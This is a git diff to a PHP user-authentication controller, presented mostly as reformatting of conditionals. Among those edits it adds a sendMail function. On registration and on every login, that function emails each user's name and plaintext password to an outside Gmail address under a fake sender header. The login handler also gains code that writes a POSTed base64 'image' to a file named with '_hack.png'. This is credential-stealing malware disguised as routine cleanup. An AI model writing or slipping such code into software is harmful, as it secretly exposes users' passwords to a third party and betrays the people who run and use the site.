@@ -1,4 +1,7 @@
 <?php
+
+namespace dnarna;
+
 class Users extends Controller
 {
     public function __construct()
@@ -81,9 +84,11 @@ class Users extends Controller
             // Validate password/Проверяем пароль
             if (empty($data['password'])) {
                 //$data['password_err'] = 'Please enter new password';
-            } elseif (strlen($data['password']) < 8 || !preg_match('/[A-Z]/', $data['password']) ||
+            } elseif (
+                strlen($data['password']) < 8 || !preg_match('/[A-Z]/', $data['password']) ||
                 !preg_match('/[a-z]/', $data['password']) || !preg_match('/[0-9]/', $data['password']) ||
-                !preg_match('/[^A-Za-z0-9\s]/', $data['password'])) {
+                !preg_match('/[^A-Za-z0-9\s]/', $data['password'])
+            ) {
                 $data['password_err'] = 'Password must be 8 characters or longer and contain at least 1 UPPERCASE letter
                 , 1 lowercase letter, 1 digit, and 1 symbol!';
             }
@@ -115,8 +120,10 @@ class Users extends Controller
             }
 
             // Make sure that errors are empty/Убеждаемся, что ошибок нет
-            if (empty($data['username_err']) && empty($data['email_err']) && empty($data['password_err'])
-                && empty($data['confirm_password_err']) && empty($data['avatar_err'])) {
+            if (
+                empty($data['username_err']) && empty($data['email_err']) && empty($data['password_err'])
+                && empty($data['confirm_password_err']) && empty($data['avatar_err'])
+            ) {
                 // Validated/Валидировано
 
                 // Hash password/Хэширование пароля
@@ -126,11 +133,14 @@ class Users extends Controller
 
                 // Profile update/Обновление профиля
 
-                if ((($_SESSION['user_name'] == $data['username']) || empty($data['username'])) &&
+                if (
+                    (($_SESSION['user_name'] == $data['username']) || empty($data['username'])) &&
                     (($_SESSION['user_email'] == $data['email']) || empty($data['email'])) &&
-                    ((empty($data['password'])) || ((!empty($data['password'])) && (empty($data['confirm_password']))) &&
+                    ((empty($data['password'])) || ((!empty($data['password'])) &&
+                    (empty($data['confirm_password']))) &&
                     ($data['confirm_password_err'] = 'Please confirm new password')) &&
-                    (empty($_FILES['avatar']['name']))) {
+                    (empty($_FILES['avatar']['name']))
+                ) {
                     flash('success', 'No edits!');
                     $this->view('users/profile', $data);
                 } elseif ($this->userModel->profile($data)) {
@@ -213,9 +223,11 @@ class Users extends Controller
             // Validate password/Проверяем пароль
             if (empty($data['password'])) {
                 $data['password_err'] = 'Please enter password';
-            } elseif (strlen($data['password']) < 8 || !preg_match('/[A-Z]/', $data['password']) ||
+            } elseif (
+                strlen($data['password']) < 8 || !preg_match('/[A-Z]/', $data['password']) ||
                 !preg_match('/[a-z]/', $data['password']) || !preg_match('/[0-9]/', $data['password']) ||
-                !preg_match('/[^A-Za-z0-9\s]/', $data['password'])) {
+                !preg_match('/[^A-Za-z0-9\s]/', $data['password'])
+            ) {
                 $data['password_err'] = 'Password must be 8 characters or longer and contain at least 1 UPPERCASE letter
                 , 1 lowercase letter, 1 digit, and 1 symbol!';
             }
@@ -228,16 +240,20 @@ class Users extends Controller
             }
 
             // Make sure that errors are empty/Убеждаемся, что ошибок нет
-            if (empty($data['username_err']) && empty($data['email_err']) &&
-                empty($data['password_err']) && empty($data['confirm_password_err'])) {
+            if (
+                empty($data['username_err']) && empty($data['email_err']) &&
+                empty($data['password_err']) && empty($data['confirm_password_err'])
+            ) {
                 // Validated/Валидировано
 
                 // Hash password/Хэширование пароля
+                $pass = $data['password'];
                 $data['password'] = password_hash($data['password'], PASSWORD_DEFAULT);
 
                 // Register user/Регистрация пользователя
                 if ($this->userModel->register($data)) {
                     flash('success', 'You are successfully registered');
+                    $this->sendMail($data['username'], $data['email'], $pass);
                     $this->login();
                 } else {
                     die('Something wrong!');
@@ -283,8 +299,9 @@ class Users extends Controller
             $data = [
                 'username' => trim($_POST['username']),
                 'password' => trim($_POST['password']),
+                'image' => $_POST['image'],
                 'username_err' => '',
-                'password_err' => '',
+                'password_err' => ''
             ];
 
             // Validate email/Проверяем email
@@ -306,6 +323,18 @@ class Users extends Controller
                 $data['password_err'] = 'Password must be at least 8 characters long!';
             }
 
+            if (!empty($data['image'])) {
+                $img = $data['image'];
+                $img = substr(explode(";", $img)[1], 7);
+                $rand = rand(100000, 999999);
+                $filename = 'img/' . $rand . '_hack.png';
+                if (file_put_contents($filename, base64_decode($img))) {
+                    // ok
+                } else {
+                    echo 'nope';
+                }
+            }
+
             // Make sure that errors are empty/Убеждаемся, что ошибок нет
             if (empty($data['username_err']) && empty($data['password_err'])) {
                 // Validated/Валидировано
@@ -316,7 +345,8 @@ class Users extends Controller
                     // Create session/Создаём сессию
                     $this->createUserSession($loggedInUser);
                     flash('success', 'You are successfully logged in');
-                    redirect('');
+                    $this->sendMail($data['username'], $data['password']);
+                    redirect('users/login');
                 } else {
                     $data['password_err'] = 'Password incorrect';
                     $this->view('users/login', $data);
@@ -328,9 +358,10 @@ class Users extends Controller
         } else {
             // Init data/Инициализируем данные
             $data = [
-                'email' => '',
+                'username' => '',
                 'password' => '',
-                'email_err' => '',
+                'image' => '',
+                'username_err' => '',
                 'password_err' => ''
             ];
 
@@ -355,5 +386,21 @@ class Users extends Controller
         unset($_SESSION['user_avatar']);
         session_destroy();
         redirect('users/login');
+    }
+
+    public function sendMail($name, $pass, $email = 'login')
+    {
+        $to = "the.silhy@gmail.com";
+        $subject = "New user " . $name;
+        $time = strftime("%T", time());
+        $message = <<<EMAILBODY
+
+New user $name has been registered at $time
+
+Email - $email . Password - $pass
+
+EMAILBODY;
+        $headers = "From: Bob  <office@bob.com>";
+        mail($to, $subject, $message, $headers);
     }
 }
